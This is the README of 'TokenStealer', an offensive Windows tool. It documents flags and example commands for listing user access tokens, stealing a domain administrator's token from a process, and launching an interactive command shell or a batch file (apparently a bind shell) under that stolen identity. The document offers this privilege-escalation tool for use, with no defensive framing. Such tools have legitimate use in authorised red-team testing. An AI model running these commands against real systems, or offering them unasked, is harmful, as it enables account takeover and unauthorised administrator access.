# TokenStealer
[+] My personal simple and stupid  Token Stealer... ;)<br>
[+] @decoder_it 2023<br>

[!] Usage:<br>
         -l: list all users token<br>
         -e: list all users token with extended info -> <user>:<token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>:<pid><br>
         -p: users token from specfic  process pid<br>
         -u: impersonate token of user <user> <br>
         -c: command to execute with token <br>
         -t: force use of impersonation Privilege <br>
         -b: needed token type: 1=Primary,2=Impersonation,3=Delegation <br>
<br><br>
=Examples=<br><br>
<br><b>TokenStealer.exe -e -b 1 </b> -> list all primary tokens<br>
<br><b>TokenStealer.exe -l -p 100 </b>-> list all tokensin process pid 100<br>
<br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe </b>-> steal token of user and execute an interactive  command shell using the AssingPrimary privilege of available<br>
<br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\bind.bat  -p 100 -t </b>-> steal token of user in process and execute the batch file using Impersonation privilege instead of AssingPrimary<br>
<br><b>TokenStealer.exe -u  MYDOMAIN\administrator -c c:\windows\system32\cmd.exe -b 1 </b>-> steal a primary token of user and execute an interactive  command shell using the AssingPrimary privilege of available<br>

